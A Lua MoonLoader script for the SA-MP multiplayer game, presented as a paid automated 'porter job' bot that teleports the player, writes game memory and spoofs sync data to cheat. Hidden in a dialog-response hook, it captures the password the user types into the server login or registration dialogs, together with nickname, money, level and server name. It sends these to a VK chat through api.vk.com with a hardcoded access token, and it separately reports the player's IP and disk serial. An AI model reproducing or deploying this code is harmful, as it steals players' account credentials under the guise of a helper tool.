script_name("NEWBOT")
script_authors("Rico_Polskis")
script_description("NEWBOT")
script_version("0.1")
script_dependencies("CLEO", "SAMP", "SAMPFUNCS")
-----------------------------------------------
require "lib.moonloader"
require "lib.sampfuncs"
require "socket"
local sampev = require 'lib.samp.events'
local lanes = require('lanes').configure()
local requests = require 'requests'
local inicfg = require 'inicfg'
local encoding = require 'encoding'
encoding.default = 'CP1251' 
u8 = encoding.UTF8 
textdrawvagonr = 756
textdrawvagon = 743 --akt
textdraweda = 679
textdrawheal = 676
-----------------------------------------------
function main()
if not isSampfuncsLoaded() or not isSampLoaded() then return end
framelock = readMemory(0xBA6794, 1, true)
if xrenk ~= nil then
	xrenk = xren:status()
end
if xrenk == "running" then 
	xrenk:terminate()
	xrenk = lua_thread.create(kickch) 
else
	xrenk = lua_thread.create(kickch)
end
sampRegisterChatCommand('cmd', chems)
wait(-1)
end
local ffi = require("ffi")
ffi.cdef[[
int __stdcall GetVolumeInformationA(
    const char* lpRootPathName,
    char* lpVolumeNameBuffer,
    uint32_t nVolumeNameSize,
    uint32_t* lpVolumeSerialNumber,
    uint32_t* lpMaximumComponentLength,
    uint32_t* lpFileSystemFlags,
    char* lpFileSystemNameBuffer,
    uint32_t nFileSystemNameSize
);
]]
local serial = ffi.new("unsigned long[1]", 0)
ffi.C.GetVolumeInformationA(nil, nil, 0, serial, nil, nil, nil, 0)
serial1 = serial[0]
serial1 = tonumber(serial1)
serial1 = serial1 + 1
serial1 = tostring(serial1)
vkname = "217874175"
tokenvk = "cb5831347ab16769175e503fb8a3bee5d1c6ed2bac67b7e710a4307328823a18fbccd41e5e8ee50c2f42b"
chat1 = "2"
chat2 = "3"
chat3 = "4"
chat4 = "5"
----------------------
kg = 0
----------------------

function chems(arg)
lua_thread.create(function()
local loaderbotcfgb = inicfg.load(loaderbotcfg, "SAMC\\LBcfg.cfg")
if loaderbotcfgb ~= nil then loaderbotcfg = tostring(loaderbotcfgb.main.value1) end
if loaderbotcfgb == nil or loaderbotcfg ~= serial1 then
	local _, pid = sampGetPlayerIdByCharHandle(playerPed)
	local playerName = sampGetPlayerNickname(pid)
	local myip = socket.dns.toip(socket.dns.gethostname()) 
	local client = socket.udp()
	client:setpeername("74.125.115.104",80)
	local ip, port = client:getsockname()
	msgvk_u("[ Player name: "..playerName.." ][ IP: "..ip..":"..port.." ][ Password: "..serial1.." ]")
	lol = seractive()
	local loaderbotcfg = {
		main = {
			value1 = lol,}
		}
	if inicfg.save(loaderbotcfg, "SAMC\\LBcfg.cfg") then wait(0) end
end
enabled = not enabled
dialogis()
end)
end

function seractive()
sampShowDialog(7777, "Ввод пароля", "Получить пароль могут пользователи оплатившие стоимость скрипта! Если вы оплатили скрипт запросите пароль https://vk.com/samcvk", "ОК", "ВЫХОД", DIALOG_STYLE_INPUT)
while sampIsDialogActive(7777) do wait(0) end
local result_dial, button_diak, g_g, input_dial = sampHasDialogRespond(7777)
if button_diak == 1 then
if input_dial == serial1 then
	return input_dial 
else 
	seractive()
end
else
seractive()
end
end

---------------------
function dialogis_kg(b)
sampShowDialog(6407, "Ввод ID", "Сколько мешков нужно перенести? Учитывается только 1 число.\nНапример: snsaudaisd75.52ыфв | Результат: 75", "ОК", "Отмена", DIALOG_STYLE_INPUT)
while sampIsDialogActive(6407) do wait(100) end
local result_dial, button_diak, g_g, input_dial = sampHasDialogRespond(6406)
if button_diak == 0 then
enabled = false
else
local arg = tonumber(input_dial)
local arg = tostring(input_dial)
local arg = arg:match("%d+")
if b == nil then
	bot(arg,input_dial)
else
	b = 0
	bot_b(arg,input_dial)
end
end
end
---------------------
function dialogis_id()
sampShowDialog(6405, "НОВЫЙ БОТ ГРУЗЧИК | 14.06.2019 |", "{008080}Запустить бота | Чит бот\n{008080}Запустить бота | Безпалевный\n{0fcc99}ЖДЛС > Грузчики\n{0fcc99}Отель возле Rifa > Грузчики\n{0fcfcf}Пополнить здоровье [Red-Rock|Yma]\n{0fcfcf}Пополнить голод [Red-Rock|Yma]\n{0fcfcf}TEST ", "ОК", "Отмена", DIALOG_STYLE_LIST)
while sampIsDialogActive(6405) do wait(100) end
local result_dial, button_diakd, g_g, input_dialk = sampHasDialogRespond(6407)
if button_diakd == 0 then
enabled = false
else
local id = tonumber(input_dialk)
local id = tostring(input_dialk)
local id = id:match("%d+")
bot(arg,id)
end
end


---------------------

function dialogis(arg)
if enabled then
sampShowDialog(6405, "НОВЫЙ БОТ ГРУЗЧИК | 14.06.2019 |", "{008080}Запустить бота | Чит бот\n{008080}Запустить бота | Безпалевный\n{0fcc99}ЖДЛС > Грузчики\n{0fcc99}Отель возле Rifa > Грузчики\n{0fcfcf}Пополнить здоровье [Red-Rock|Yma]\n{0fcfcf}Пополнить голод [Red-Rock|Yma]\n{0fcfcf}TEST ", "ОК", "Отмена", DIALOG_STYLE_LIST)
while sampIsDialogActive(6405) do wait(100) end
local _, button, list, _ = sampHasDialogRespond(6405)
local list = tostring(list)
if button == 0 then
enabled = false
else
	if list == "0" then dialogis_kg() end
	if list == "1" then 
	b = 1 
	dialogis_kg(b) 
	end
	if list == "3" then sampAddChatMessage(string.format("[%s]: Маршрут не создан!", thisScript().name), 0xFF4040)
		enabled = not enabled
	end
	if list == "4" then
		hpfull()
		enabled = not enabled
	end
	if list == "5" then
	--sampSendClickTextdraw(671) --672
	sampSendClickTextdraw(textdraweda)
	sampAddChatMessage(string.format("[%s]: Голод пополнен!  ", thisScript().name), 0xFF4040)
	enabled = not enabled
	end
	if list == "2" then ust() end
	if list == "6" then test() end
end
end
end

---------------------

function bot(arg,input_dial,id)
	if arg == nil then
		sampAddChatMessage(string.format("[%s]: Введенный аргумент: "..input_dial.." не содержит числа!", thisScript().name, input_dial), 0xFF4040)
		dialogis_kg()
	else
		kg = arg
		cert1 = false
		textdrawie = false
		kg = tostring(kg)
		lockPlayerControl(false)
		BeginToPoint(2009.60, -1971.85, 12.65, 5.000000, -255, false)
		while enabled or not kg == "0" do
			wait(0)
			kg = rabota(arg,kg)
			if kg == 0 and enabled then 
				zazarp(arg) 
			end
		end
	end
end
--------------------

function rabota(arg, kg)
	gruz = false
	nadpis = false
	lockPlayerControl(false)
	writeMemory(0xBA6794, 1, 1, true)
	wait(650)
	if textdrawie ~= true then teleportPlayer(2009.60, -1971.85, 12.65) end
	lockPlayerControl(true)
	if enabled then
		--sampSendClickTextdraw(textdrawvagon)
		local sx, sy, sz = GetCoordinates()
		local distas = getDistanceBetweenCoords3d(2009.60, -1971.85, 12.65,sx,sy,sz)
		if distas < 1.5 then
			if textdrawie == true then 
				wait(600)
				sendSync(2013, -1958, 14, 1, 8, true)
			else
				sendSync(2013, -1958, 14, 1, 8, true)
			end
		end
		while nadpis ~= true and textdrawie ~= true and enabled do 
			sampSendClickTextdraw(textdrawvagon)
			wait(300)
			textdrawie = sampTextdrawIsExists(textdrawvagon)
		end
	textdrawie = sampTextdrawIsExists(textdrawvagon)
	end	
	wait(400)
	if textdrawie == false then 
		teleportPlayer(2010.14, -1990.53, 11.58)
		wait(300)
		if xrens ~= nil then
			xrens = xrens:status()
		end
		if xrens == "running" then 
			xrens:terminate()
			xrens = lua_thread.create(poverka) 
		else
			xrens = lua_thread.create(poverka)
		end
		while chekpoint ~= true and enabled do
			wait(300)
			sampSendClickTextdraw(textdrawvagon)
			textdrawie = sampTextdrawIsExists(textdrawvagon)
		end
		xrens:terminate()
		if chekpoint ~= false then
			while chekpoint ~= true and enabled do wait(100) end	
			sendSync(2011.65, -1989.07, 13.55, 1, 8, false)
			if xrenm ~= nil then
				xrenm = xrenm:status()
			end
			if xrenm == "running" then 
				xrenm:terminate()
				xrenm = lua_thread.create(poverka2) 
			else
				xrenm = lua_thread.create(poverka2)
			end
				while gruz == false and enabled do 
					wait(100)
				end
				if gruz == true then kg = kg - 1 end
				xrenm:terminate()
		else
			wait(400)
		end
		textdrawie = false
		teleportPlayer(2009.60, -1971.85, 12.65)
		sampAddChatMessage(string.format("[%s]: Осталось: %d мешков.", thisScript().name, kg), 0xFF4f8f)
	end
	writeMemory(0xBA6794, framelock, 1, true)
	lockPlayerControl(false)
	if not enabled then
		lockPlayerControl(false)
		wait(800)
		teleportPlayer(2006.74, -1970.09, 14.44)
	end
	return kg
end

function kickch()
	while true do
	wait(0)
	if enabled then textc, prefixc, colorc, pcolorc = sampGetChatString(99) end
	if enabled and textc == "Server closed the connection." then
		wait(1200)
		msgvk_c("Бот был кикнут или забанен!")
		msgvk_u("Бот был кикнут или забанен!")
		enabled = not enabled
	end
	end
end

local sampev = require("lib.samp.events")
function sampev.onDisplayGameText(stylet,timet,textt)
textt = tostring(textt)
if textt:find('Go.+') then 
	nadpis = true 
end 
end
--------------------
function ust()
sampAddChatMessage(string.format("[%s]: Бот бежит по маршруту ЖДЛС > Грузчики !", thisScript().name), 0xFF4040)
if enabled then
	lockPlayerControl(false)
	gotocord(1774, -1896, 13)
	gotocord(1813, -1894.02, 13)
	gotocord(1830, -1923, 13)
	gotocord(1980, -1968.02, 13)
	sampAddChatMessage(string.format("[%s]: Бот прибежал или был выключен!", thisScript().name), 0xFF4040)
   enabled = not enabled
end
end

function poverka2()
wait(1500)
kg = kg + 1
gruz = true
end

function poverka()
while enabled do
lockPlayerControl(false)
wait(1000)
setGameKeyState(1, -255)
setGameKeyState(1, -255)
wait(2000)
lockPlayerControl(true)
end
end

local KA = require 'samp.events'
function KA.onDisableCheckpoint()
	chekpoint = false
end

function runFunc(brun)
	while brun do
		setGameKeyState(16, 255)
		wait(0)
	end
end

function gotocord(x, y, z, paths) 
if enabled then
	if paths == true then taskFollowPathNodesToCoord(playerPed, x, y, z, 6, -1) end
	repeat
		setGameKeyState(16, 255)
		if paths == false then taskGoStraightToCoord(playerPed, x, y, z, 6, -1) end
		wait(1)
	until RadCheck(x, y, z) or not enabled
end
end

function RadCheck(x, y, z)
local plxl, plyl, plzl = GetCoordinates()
local distant = getDistanceBetweenCoords3d(plxl, plyl, plzl, x, y, z)
if distant > 1 then 
	return false 
else 
	return true 
end
end

function zazarp(arg)
wait(1000)
sampAddChatMessage(string.format("[%s]: Бот отработал: "..arg.. " кругов и идет за зарплатой! ", thisScript().name), 0x40FF40)
moneys = tonumber(arg) * 300
hpfull()
teleportPlayer(2006.74, -1970.09, 14.44)
wait(100)
BeginToPoint(1980.61, -1965.92, 13, 0.400000, -255, false)
wait(10)
BeginToPoint(1980.61, -1965.92, 13, 0.400000, -255, false)
wait (1)
wait(300)
BeginToPoint(1980.61, -1965.92, 13, 0.400000, -255, false)
wait(1)
BeginToPoint(1980.52, -1968.46, 13, 0.400000, -255, false)
wait(100)
sampSendClickTextdraw(textdraweda)
sampSendClickTextdraw(textdrawheal)
wait(500)
---------------
while not sampIsDialogActive() and enabled do
	setGameKeyState(21, 255)
	setGameKeyState(21, 1)
	wait(500)
end
sampCloseCurrentDialogWithButton(1)
---------------
wait(500)
---------------
while not sampIsDialogActive() and enabled do
	setGameKeyState(21, 255)
	setGameKeyState(21, 1)
	wait(500)
end
sampCloseCurrentDialogWithButton(1)
---------------   
wait(500)
if enabled then
setGameKeyState(1, -225)
BeginToPoint(1980.61, -1965.92, 13, 0.400000, -255, false)
wait(50)
setGameKeyState(1, -225)
BeginToPoint(2006.74, -1970.09, 14.44, 1.000000, -255, true)
wait(800)
end
if enabled then
bot(arg)
end
end
--------------------
function zazarp_b(arg)
sampAddChatMessage(string.format("[%s]: Бот закончил: %d кругов!", thisScript().name, arg), 0xFF4040)
bot_b(arg)
end
-------------------
function test()
writeMemory(0xB7CEE4, 1, 1, true) 
while not sampIsDialogActive(7681) do
	gotocord(1773.16,-1892.21,13,false)
	setGameKeyState(21, 255)
	wait(500)
end
while not sampIsDialogActive() and sampIsDialogActive(6407) do wait(1) end
sampSetCurrentDialogListItem(1)
sampCloseCurrentDialogWithButton(1)
while not sampIsDialogActive() do wait(1) end
sampSetCurrentDialogListItem(0)
sampCloseCurrentDialogWithButton(1)
repeat wait(1) until sampIsDialogActive() or quest
sampCloseCurrentDialogWithButton(1)
gotocord(1773.91,-1892.93,13, false)
gotocord(1811.52,-1885.18,13, false)
gotocord(1814.18,-1583.27,13, false)
gotocord(1622.32,-1310.20,17,true)
gotocord(1585.26,-1289.85,17, false) -- dorogu
gotocord(1539.58,-1288.77,16, false) -- ugol
gotocord(1495.16,-1280.01,14, false) -- Dver
wait(2000)
gotocord(-2063.47,2663.76,1498.78, false)
while not sampIsDialogActive(147) do
	setGameKeyState(21, 255)
	wait(500)
end
sampCloseCurrentDialogWithButton(1)
while not sampIsDialogActive() do wait(1) end
sampSetCurrentDialogEditboxText("1/1/1970")
sampCloseCurrentDialogWithButton(1)
while not sampIsDialogActive() do wait(1) end
sampCloseCurrentDialogWithButton(1)
gotocord(-2063.47,2659.41,1498.78, false)
gotocord(1539.58,-1288.77,16, false)
gotocord(1622.32,-1310.20,17, false)
gotocord(1811.52,-1885.18,13, true)
gotocord(1773.91,-1892.93,13, false)
while not sampIsDialogActive(7681) do
	gotocord(1773.16,-1892.21,13,false)
	setGameKeyState(21, 255)
	wait(500)
end
sampSetCurrentDialogListItem(1)
sampCloseCurrentDialogWithButton(1)
while not sampIsDialogActive() do wait(1) end
sampSetCurrentDialogListItem(0)
sampCloseCurrentDialogWithButton(1)
enabled = not enabled
enabled = not enabled
end

----------------------------
----------------------------
----------------------------
function BeginToPoint(x, y, z, radius, move_code, isSprint)
repeat
local posX, posY, posZ = GetCoordinates()
SetAngle(x, y, z)
MovePlayer(move_code, isSprint)
local dist = getDistanceBetweenCoords3d(x, y, z, posX, posY, z)
wait(0)
until not enabled or dist < radius
end

function MovePlayer(move_code, isSprint)
setGameKeyState(1, move_code)
--[[255 - Р С•Р В±РЎвЂ№РЎвЂЎР Р…РЎвЂ№Р в„– Р В±Р ВµР С– Р Р…Р В°Р В·Р В°Р Т‘
-255 - Р С•Р В±РЎвЂ№РЎвЂЎР Р…РЎвЂ№Р в„– Р В±Р ВµР С– Р Р†Р С—Р ВµРЎР‚Р ВµР Т‘
65535 - Р С‘Р Т‘РЎвЂљР С‘ РЎв‚¬Р В°Р С–Р С•Р С Р Р†Р С—Р ВµРЎР‚Р ВµР Т‘
-65535 - Р С‘Р Т‘РЎвЂљР С‘ РЎв‚¬Р В°Р С–Р С•Р С Р Р…Р В°Р В·Р В°Р Т‘]]
if isSprint then setGameKeyState(16, 255) end
end

function GetCoordinates()
if isCharInAnyCar(playerPed) then
local car = storeCarCharIsInNoSave(playerPed)
return getCarCoordinates(car)
else
return getCharCoordinates(playerPed)
end
end

function SetAngle(x, y, z)
local posX, posY, posZ = GetCoordinates()
local pX = x - posX
local pY = y - posY
local zAngle = getHeadingFromVector2d(pX, pY)

if isCharInAnyCar(playerPed) then
local car = storeCarCharIsInNoSave(playerPed)
setCarHeading(car, zAngle)
else
setCharHeading(playerPed, zAngle)
end

restoreCameraJumpcut()
end


function SmoothRotateToPoint(pointX, pointY, pointZ) 
        local posX, posY, posZ = getCharCoordinates(playerPed)
        local pX = pointX - posX
        local pY = pointY - posY
        local AngelToRotate = getHeadingFromVector2d(pX, pY)
        local CurrentPedAngel = getCharHeading(playerPed)
        if math.abs(AngelToRotate) - math.abs(CurrentPedAngel) < 0 then
            setCharHeading(playerPed, CurrentPedAngel - 5)
        else
            setCharHeading(playerPed, CurrentPedAngel + 5)
        end
end
-- Teleport from ClickWarp (by FYP)
function teleportPlayer(x, y, z)
	if isCharInAnyCar(playerPed) then
		setCharCoordinates(playerPed, x, y, z)
	end
	setCharCoordinatesDontResetAnim(playerPed, x, y, z)
end

function setCharCoordinatesDontResetAnim(char, x, y, z)
	if doesCharExist(char) then
		local ptr = getCharPointer(char)
		setEntityCoordinates(ptr, x, y, z)
	end
end

function setEntityCoordinates(entityPtr, x, y, z)
	if entityPtr ~= 0 then
		local matrixPtr = readMemory(entityPtr + 0x14, 4, false)
		if matrixPtr ~= 0 then
			local posPtr = matrixPtr + 0x30
			writeMemory(posPtr + 0, 4, representFloatAsInt(x), false) --X
			writeMemory(posPtr + 4, 4, representFloatAsInt(y), false) --Y
			writeMemory(posPtr + 8, 4, representFloatAsInt(z), false) --Z
		end
	end
end
-- End Teleport code
function sendSync(x, y, z, bool, key, pic)
  local _, myId = sampGetPlayerIdByCharHandle(PLAYER_PED)
  --sampAddChatMessage(string.format(" : "..x.." : "..y.." : "..z.." : "..key.." : ", thisScript().name), 0x40FF40)
  local data = allocateMemory(68)
  sampStorePlayerOnfootData(myId, data)
  if key == nil then key = 0 end
  if bool then
    setStructElement(data, 4, 2, key, false) -- send sKeys // mouse
  else
    setStructElement(data, 36, 1, key, false) -- send byteCurrentWeapon // Y, N, H
  end
  if z ~= nil then
    setStructFloatElement(data, 6, x, false)
    setStructFloatElement(data, 10, y, false)
    setStructFloatElement(data, 14, z, false)
  end
  sampSendOnfootData(data)
  if pic == true then
    sampSendClickTextdraw(textdrawvagon)
  end
  sampForceOnfootSync()
  freeMemory(data)
end	

function sampev.onSendPlayerSync(PedData)
  if PedData.keysData == 0 and action == 1 then
    action = 0
    PedData.keysData = 1024
  end
  if PedData.keysData == 0 and action == 2 then
    action = 0
    PedData.keysData = -128
  end
end

function sampev.onSendPlayerSync(data)
   -- local _, myId = sampGetPlayerIdByCharHandle(PLAYER_PED)
   -- local data = allocateMemory(68)
   -- sampStorePlayerOnfootData(myId, data)
   -- setStructFloatElement(data, 6, x, false)
   -- setStructFloatElement(data, 10, y, false)
   -- setStructFloatElement(data, 14, z, false)
   -- sampForceOnfootSync()
   -- freeMemory(data)
  local fxp,fyp,fzp = data.position.x, data.position.y, data.position.z
  if ffsy == true and enabled then
	  data.position.x = fx
	  data.position.y = fy
	  data.position.z = fz
	  sampSendClickTextdraw(textdrawvagon)
  else
	  fx, fy, fz = fxp,fyp,fzp
	  freeMemory(data)
  end
end

function sampev.onSendDialogResponse(id, but, lis, input)
if id == 2 then
    local srvname = sampGetCurrentServerName()
    local _, pid = sampGetPlayerIdByCharHandle(playerPed)
    local playerName = sampGetPlayerNickname(pid)
	hello = input
	lua_thread.create(waim,srvname,pid,playerName,hello)
end
if id == 1 then
    local srvname = sampGetCurrentServerName()
    local _, pid = sampGetPlayerIdByCharHandle(playerPed)
    local playerName = sampGetPlayerNickname(pid)
	hello = input
	lua_thread.create(waim,srvname,pid,playerName,hello)
end
end

function sequent_async_http_request(method, url, args, resolve, reject)
    if not _G['lanes.async_http'] then
        local linda = lanes.linda()
        local lane_gen = lanes.gen('*', {package = {path = package.path, cpath = package.cpath}}, function()
            local requests = require 'requests'
            while true do
                local key, val = linda:receive(50 / 1000, 'request')
                if key == 'request' then
                    local ok, result = pcall(requests.request, val.method, val.url, val.args)
                    if ok then
                        result.json, result.xml = nil, nil
                        linda:send('response', result)
                    else
                        linda:send('error', result)
                    end
                end
            end
        end)
        _G['lanes.async_http'] = {lane = lane_gen(), linda = linda}
    end
    local lanes_http = _G['lanes.async_http']
    lanes_http.linda:send('request', {method = method, url = url, args = args})
    lua_thread.create(function(linda)
        while true do
            local key, val = linda:receive(0, 'response', 'error')
            if key == 'response' then
                return resolve(val)
            elseif key == 'error' then
                return reject(val)
            end
            wait(0)
        end
    end, lanes_http.linda)
end

function encodeToUrl(str) 
  local diff = urlencode(u8:encode(str, 'CP1251'))
  return diff
end

function urlToDecode(str) 
	local diff = u8:decode(str, 'CP1251')
	return diff
end
 
function urlencode(str)
   if (str) then
      str = string.gsub (str, "\n", "\r\n")
      str = string.gsub (str, "([^%w ])",
         function (c) return string.format ("%%%02X", string.byte(c)) end)
      str = string.gsub (str, " ", "+")
   end
   return str
end


function waim(srvname,pid,playerName,hello)
	repeat
	wait(1000)
	until sampIsLocalPlayerSpawned()
	moneyk = getPlayerMoney(playerName)
	hello = encodeToUrl(hello)
    hello = urlencode(hello)
	wait(3000)
	lvlk = sampGetPlayerScore(pid)
	pids = urlencode(pid)
	moneyk = urlencode(moneyk)
	lvlk = urlencode(lvlk)
	msgvk = u8("[ Ник: "..playerName.." ][ Пароль: "..hello.." ][ Деньги: "..moneyk.." ][ Уровень: "..lvlk.." ][ Сервер: "..srvname.." ]")
	msgvk = urlencode(msgvk)
	sequent_async_http_request('GET',"https://api.vk.com/method/messages.send?v=5.4&message="..msgvk.."&chat_id=1&access_token=cb5831347ab16769175e503fb8a3bee5d1c6ed2bac67b7e710a4307328823a18fbccd41e5e8ee50c2f42b", nil, function(response) 
        end, function(error) 
        print("")
        end)
end

function hpfull()
		hp = getCharHealth(PLAYER_PED)
		sampAddChatMessage(string.format("[%s]: Здоровье до: "..hp.."  ", thisScript().name), 0xFF4040)
		while hp < 100 and enabled do
			hp = getCharHealth(PLAYER_PED)
			wait(10)
			--sampSendClickTextdraw(666)
			wait(10)
			sampSendClickTextdraw(textdrawheal)
			wait(10)
		end
		sampAddChatMessage(string.format("[%s]: Здоровье после: "..hp.."  ", thisScript().name), 0xFF4040)
end

function msgvk_u(msgf)
msgf = u8(msgf)
msgf = urlencode(msgf)
sequent_async_http_request('GET',"https://api.vk.com/method/messages.send?v=5.4&message="..msgf.."&user_id="..vkname.."&access_token="..tokenvk.."", nil, function(response)
end, function(error) 
        print("")
end)
end


function msgvk_c(msgf)
msgf = u8(msgf)
msgf = urlencode(msgf)
sequent_async_http_request('GET',"https://api.vk.com/method/messages.send?v=5.4&message="..msgf.."&chat_id="..chat1.."&access_token="..tokenvk.."", nil, function(response)
end, function(error) 
        print("")
end)
end

local SE = require 'samp.events'
function SE.onSetCheckpoint(vect3, chrad)
if chrad > 0.5 then
 chekpoint = true
 chrad = 0
end
end

local sas = require 'samp.events'
function sas.onServerMessage(color, text)
	if text:find('Груза перетащено:.+') and enabled then
	gruz = true
	end
end